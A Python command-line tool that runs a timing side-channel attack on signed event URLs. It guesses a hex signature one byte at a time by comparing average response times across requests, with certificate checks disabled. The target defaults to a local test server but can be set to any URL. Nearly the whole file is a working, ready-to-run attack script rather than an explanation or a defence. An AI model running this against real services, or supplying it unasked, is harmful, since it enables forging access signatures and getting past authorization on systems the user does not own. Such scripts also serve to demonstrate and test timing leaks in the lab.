#!/usr/bin/env python

import argparse, requests, time, logging, csv, operator
from collections import defaultdict
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig()
logger = logging.getLogger('logger')

input_signature_seed = None
input_attack_endpoint = None
input_eventid = None
input_iterations = None

SAVE_TO_CSV = False

BYTE_LIST = '0123456789abcdef'

def save_to_csv(results, position):
    if results:
        with open('results' + str(position) + '.csv', 'w') as f:
            writer = csv.writer(f, delimiter=',')
            for row in results:
                writer.writerow(row)
            logger.debug("Done Writing")    

def measure_request(signature, results):
    logger.debug("Entering measure_request")
    url = input_attack_endpoint.format(input_eventid, signature)
    logger.debug("Target URL: {0}".format(url))
    elapsed_time = requests.get(url, headers={'cache-control': 'no-cache'}, verify=False).elapsed.total_seconds()
    results.append((signature, elapsed_time))
    logger.debug('signature: {0} | elapsed time: {1}'.format(signature, elapsed_time))

def determine_byte(position, results):
    logger.debug("Entering determine_byte")
    logger.debug("\n Position: {0} \n Results: {1}".format(position, results))

    results_dict = defaultdict(list)

    for r in results:
        results_dict[r[0]] = []

    logger.debug("Results dictionary initialized with signatures and empty arrays: \n {0}".format(results_dict))
    
    for r in results:
        logger.debug("Signature: {0}".format(r[0]))
        logger.debug("Elapsed times: {0}".format(results_dict[r[0]]))
        curr_array = results_dict[r[0]] 
        curr_array.append(r[1])

    averages = defaultdict(list)
    for signature, response_times in results_dict.items(): 
        logger.debug("Signature: %s - Elapsed times: %s" % (str(signature), str(response_times)))
        if len(response_times) < 2:
            raise IndexError('Getting an average requires at least 2 response times')   

        average = sum(response_times) / len(response_times)       
        averages[signature] = average
    
    logger.debug("Averages for the byte: {0}".format(averages))

    guessed_byte = str(max(averages, key=averages.get))[position - 1 : position ]

    logger.info("Guessed byte: {0}".format(guessed_byte))

    averages.clear()
    results_dict.clear()
    
    return guessed_byte

def timing_attack():
    logger.debug("Entering timing_attack")
    logger.debug("\n Iterations: {0} \n signature_seed: {1}".format(input_iterations, input_signature_seed))
    result_sig = input_signature_seed
    position = 1
    count = 1
    while position < (len(result_sig) + 1):
        logger.info("Iterating through bytes at position: {0}".format(position))
        results = []
        logger.info("Guessing Signature: {0}".format(''.join(result_sig)))
        while count <= input_iterations:
            logger.debug("Count: {0}".format(count))
            logger.debug("Iterations: {0}".format(input_iterations))
            logger.debug(count < input_iterations)
            
            for c in BYTE_LIST:
                result_sig[position - 1] = c
                attack_sig = ''.join(result_sig)
                measure_request(attack_sig, results)
            count += 1      

        if SAVE_TO_CSV:
            save_to_csv(results, position)       
        result_sig[position - 1] = determine_byte(position, results)
        position += 1
        count = 1
    return result_sig

def run_attack():
    logger.info("Starting timing attack...")
    logger.info("The attack will do {0} iterations on each byte.".format(input_iterations))
    start = time.time()
    result = timing_attack()
    logger.info("Guessing the signature is {0}".format(''.join(result)))
    end = time.time()
    elapsed = (end - start)
    logger.info("Finished executing attack. Attack took {0} seconds to complete.".format(elapsed) )

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Timing attack against event id url signatures.')
    parser.add_argument('-u', action='store', dest='url', default='http://localhost:5000/events/{0}/{1}/',
                        help='The target url.')
    parser.add_argument('-i', action='store', dest='iterations', default='2',
                        help='The # of iterations to perform per byte. Default is 2.')

    parser.add_argument('-b', action='store', dest='bytes', default='8',
                        help='The # of bytes to guess. Default is 8.')
    parser.add_argument('-e', action='store', dest='eventid', default='19295929',
                        help='The EventID. Default is 19295929.')
    parser.add_argument('-f', action='store_true', dest='csv', default=False,
                        help='Save data to CSVs.')                          
    parser.add_argument('-v', action='store_true', dest='verbose', default=False,
                        help='Log to console in debug.')                                
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')

    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Logging in debug mode.")
    else:
        logger.setLevel(logging.INFO)
        logger.debug("Logging in info mode.")

    if args.csv:
        SAVE_TO_CSV = True

    logger.debug("args url: {0}".format(args.url))
    logger.debug("args iterations: {0}".format(args.iterations))
    logger.debug("args bytes: {0}".format(args.bytes))
    logger.debug("args event_id: {0}".format(args.eventid))    

    input_signature_seed = ['0'] * int(args.bytes)
    input_eventid = int(args.eventid)
    input_attack_endpoint = args.url
    input_iterations = int(args.iterations)

    logger.debug("input_iterations: {0}".format(input_iterations))
    logger.debug("input_eventid: {0}".format(input_eventid))
    logger.debug("input_attack_endpoint: {0}".format(input_attack_endpoint))   
    logger.debug("input_signature_seed: {0}".format(input_signature_seed))

    run_attack()


